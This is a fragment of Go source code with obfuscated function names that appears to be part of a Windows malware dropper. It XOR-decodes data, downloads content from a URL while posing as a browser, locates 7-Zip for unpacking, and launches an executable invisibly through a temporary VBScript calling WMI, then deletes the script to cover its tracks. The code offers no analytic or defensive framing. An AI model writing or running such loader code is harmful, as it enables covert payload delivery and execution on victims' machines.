func xd(d, k []byte) []byte {
	r := make([]byte, len(d))
	for i := range d {
		r[i] = d[i] ^ k[i%len(k)]
	}
	return r
}

func ri(d []byte, o int) (uint32, int) {
	return binary.BigEndian.Uint32(d[o : o+4]), o + 4
}

func rs(d []byte, o int) (string, int) {
	l, o := ri(d, o)
	return string(d[o : o+int(l)]), o + int(l)
}

func dl(url string) ([]byte, error) {
	client := &http.Client{Timeout: 15 * time.Second}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func f7z() string {
	pf := os.Getenv("ProgramFiles")
	if pf == "" {
		pf = `C:\Program Files`
	}
	pf86 := os.Getenv("ProgramFiles(x86)")
	if pf86 == "" {
		pf86 = `C:\Program Files (x86)`
	}
	tmp := os.TempDir()
	for _, c := range []string{
		filepath.Join(pf, "7-Zip", "7z.exe"),
		filepath.Join(pf86, "7-Zip", "7z.exe"),
		filepath.Join(tmp, "7zr.exe"),
	} {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}
	return ""
}

func rh(exe string) {
	if runtime.GOOS != "windows" {
		return
	}
	vbs := filepath.Join(os.TempDir(), fmt.Sprintf("w%d.vbs", os.Getpid()))
	body := "On Error Resume Next\nSet o=GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\nSet s=o.Get(\"Win32_ProcessStartup\").SpawnInstance_\ns.ShowWindow=0\no.Get(\"Win32_Process\").Create \"" + exe + "\",Null,s,p\n"
	_ = os.WriteFile(vbs, []byte(body), 0644)
	cmd := exec.Command("wscript.exe", "//B", "//nologo", vbs)
	_ = cmd.Run()
	_ = os.Remove(vbs)
}

